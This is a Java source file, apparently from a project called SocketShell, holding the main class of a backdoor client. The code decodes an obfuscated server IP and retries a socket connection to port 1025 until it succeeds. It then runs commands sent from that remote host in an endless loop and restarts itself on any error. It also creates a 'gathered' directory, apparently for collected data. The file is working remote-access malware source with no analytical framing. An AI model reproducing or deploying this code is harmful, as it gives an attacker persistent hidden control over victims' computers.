package com.github.thatcherdev.socketshell.backdoor;

import java.io.File;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;
import com.github.thatcherdev.socketshell.backend.Utils;

public class Backdoor {

	public static String ip;
	private static Socket socket;
	private static Scanner in;
	public static PrintWriter out;

	/**
	 * Starts backdoor shell.
	 *
	 * Creates 'gathered' directory and sets {@link ip} to server IP address using
	 * {@link args}.
	 * <p>
	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
	 * initiates {@link in} and {@link out} and starts infinite loop that gets
	 * command from server with {@link in} and handles command with
	 * {@link HandleCommand.handle(String command)}. If exception is thrown,
	 * {@link socket}, {@link in}, and {@link out} are closed and
	 * {@link main(String[] args} is run.
	 *
	 * @param args Command line arguments
	 */
	public static void main(String[] args) {
		try {
			ip = Utils.crypt(args[0], "SocketShellIP");
			new File("gathered").mkdir();
		} catch (Exception e) {
			System.exit(0);
		}
		try {
			while (true)
				try {
					socket = new Socket(ip, 1025);
					break;
				} catch (Exception e) {
					Thread.sleep(3000);
					continue;
				}
			in = new Scanner(socket.getInputStream());
			out = new PrintWriter(socket.getOutputStream(), true);
			while (true) {
				String command = in.nextLine();
				HandleCommand.handle(command);
			}
		} catch (Exception e) {
			try {
				if (socket != null)
					socket.close();
				if (in != null)
					in.close();
				if (out != null)
					out.close();
				main(args);
			} catch (Exception e1) {
				System.exit(0);
			}
		}
	}
}
